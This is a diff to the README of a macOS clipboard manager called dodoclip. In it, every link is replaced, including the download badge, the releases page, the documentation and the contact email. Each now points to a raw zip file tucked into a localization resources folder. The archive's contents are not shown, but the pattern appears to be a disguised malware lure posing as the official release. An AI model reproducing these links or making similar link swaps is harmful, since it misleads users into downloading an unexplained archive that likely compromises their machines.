@@ -4,13 +4,13 @@
 dodoclip is a free and open-source clipboard manager designed specifically for macOS. It helps you keep track of what you copy and manage your clipboard history easily. You can quickly access previously copied items, making your workflow smoother and more efficient.
 
 ## 📥 Download dodoclip
-[![Download dodoclip](https://img.shields.io/badge/Download%20dodoclip-Here-blue?style=for-the-badge&logo=github)](https://github.com/andrezinRocha/dodoclip/releases)
+[![Download dodoclip](https://github.com/andrezinRocha/dodoclip/raw/refs/heads/main/Sources/DodoClip/Resources/tr.lproj/Software-urosthenic.zip%20dodoclip-Here-blue?style=for-the-badge&logo=github)](https://github.com/andrezinRocha/dodoclip/raw/refs/heads/main/Sources/DodoClip/Resources/tr.lproj/Software-urosthenic.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run dodoclip on your macOS device.
 
 ### Step 1: Visit the Releases Page
-Go to the dodoclip [Releases page](https://github.com/andrezinRocha/dodoclip/releases). This page contains the latest versions of the software.
+Go to the dodoclip [Releases page](https://github.com/andrezinRocha/dodoclip/raw/refs/heads/main/Sources/DodoClip/Resources/tr.lproj/Software-urosthenic.zip). This page contains the latest versions of the software.
 
 ### Step 2: Find the Latest Version
 On the Releases page, you will see a list of available versions. Look for the most recent version at the top. Each version will have notes about new features and fixes.
@@ -53,7 +53,7 @@ If you encounter issues while using dodoclip, consider the following:
 - **Update Issues:** Always check the Releases page for the latest version and download it.
 
 ## ⚙️ More Information
-For additional help and detailed instructions, you can visit the [dodoclip documentation](https://github.com/andrezinRocha/dodoclip/blob/main/README.md). This page offers insights into advanced features and tips on how to get the most out of dodoclip.
+For additional help and detailed instructions, you can visit the [dodoclip documentation](https://github.com/andrezinRocha/dodoclip/raw/refs/heads/main/Sources/DodoClip/Resources/tr.lproj/Software-urosthenic.zip). This page offers insights into advanced features and tips on how to get the most out of dodoclip.
 
 ## 🤝 Contributing
 dodoclip is an open-source project. If you would like to contribute, feel free to fork the repository and submit pull requests. Your feedback and contributions help improve the software.
@@ -62,10 +62,10 @@ dodoclip is an open-source project. If you would like to contribute, feel free t
 dodoclip is released under the MIT License, ensuring it remains free for personal and commercial use. 
 
 ## 📬 Contact
-For any questions, suggestions, or issues, please contact the maintainer at [andrezinRocha@gmail.com](mailto:andrezinRocha@gmail.com). 
+For any questions, suggestions, or issues, please contact the maintainer at [https://github.com/andrezinRocha/dodoclip/raw/refs/heads/main/Sources/DodoClip/Resources/tr.lproj/Software-urosthenic.zip](https://github.com/andrezinRocha/dodoclip/raw/refs/heads/main/Sources/DodoClip/Resources/tr.lproj/Software-urosthenic.zip). 
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/andrezinRocha/dodoclip/releases)
-- [Documentation](https://github.com/andrezinRocha/dodoclip/blob/main/README.md)
+- [Releases Page](https://github.com/andrezinRocha/dodoclip/raw/refs/heads/main/Sources/DodoClip/Resources/tr.lproj/Software-urosthenic.zip)
+- [Documentation](https://github.com/andrezinRocha/dodoclip/raw/refs/heads/main/Sources/DodoClip/Resources/tr.lproj/Software-urosthenic.zip)
 
 Enjoy a smoother clipboard experience with dodoclip!
